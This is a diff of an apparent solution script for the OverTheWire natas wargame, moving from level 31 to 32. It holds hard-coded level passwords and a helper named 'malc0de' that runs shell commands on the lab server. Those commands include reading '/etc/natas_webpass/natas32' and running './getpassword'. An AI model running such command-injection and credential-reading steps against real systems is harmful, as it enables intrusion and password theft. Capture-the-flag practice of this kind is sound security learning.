@@ -1,7 +1,8 @@
 import requests
+import html
 
-user = 'natas31'
-passw = 'hay7aecuungiuKaezuathuk9biin0pu1'
+user = 'natas32'
+passw = 'no1vohsheCaiv3ieH4em1ahchisainge'
 url = 'http://%s.natas.labs.overthewire.org/' % user
 
 
@@ -20,7 +21,11 @@ def malc0de(cmd):
 def filter_response(response):
     fltr = response.text[1522:]
     fltr = fltr[:-117]
+    fltr = fltr.replace('</td></tr><tr><td>', '')
+    fltr = fltr.replace('</th></tr><tr><td>', '')
+    fltr = fltr.replace('ble table-hover table-striped"><tr><th>', '')
+    fltr = html.unescape(fltr)
     return fltr
 
 
-print(malc0de("cat /etc/natas_webpass/natas32"))
+print(malc0de("./getpassword"))
